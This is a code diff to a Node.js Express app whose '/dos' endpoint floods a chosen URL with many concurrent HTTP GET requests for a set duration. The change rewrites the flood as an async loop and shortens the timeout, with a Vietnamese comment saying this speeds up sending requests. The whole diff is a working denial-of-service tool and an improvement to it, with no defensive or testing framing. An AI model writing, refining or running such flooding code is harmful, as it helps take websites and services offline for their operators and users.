@@ -29,9 +29,8 @@ app.post('/dos', (req, res) => {
     let errorMessages = [];
     const startTime = Date.now();
 
-    // Khởi động các threads liên tục trong 60 giây
-    const startAttacks = () => {
-        if (isRunning) {
+    const startAttacks = async () => {
+        while (isRunning) {
             const currentTime = Date.now();
             if (currentTime - startTime >= duration) {
                 isRunning = false;
@@ -46,7 +45,7 @@ app.post('/dos', (req, res) => {
             const attackPromises = [];
             for (let i = 0; i < threads; i++) {
                 attackPromises.push(
-                    axios.get(url, { timeout: 0 }) // Thay đổi timeout nếu cần
+                    axios.get(url, { timeout: 1000 }) // Timeout ngắn để tăng tốc độ gửi request
                         .then(() => {
                             successfulRequests++;
                         })
@@ -56,10 +55,8 @@ app.post('/dos', (req, res) => {
                         })
                 );
             }
-            Promise.all(attackPromises).then(() => {
-                // Gửi yêu cầu xong thì gọi lại hàm này ngay lập tức
-                startAttacks();
-            });
+
+            await Promise.all(attackPromises);
         }
     };
 
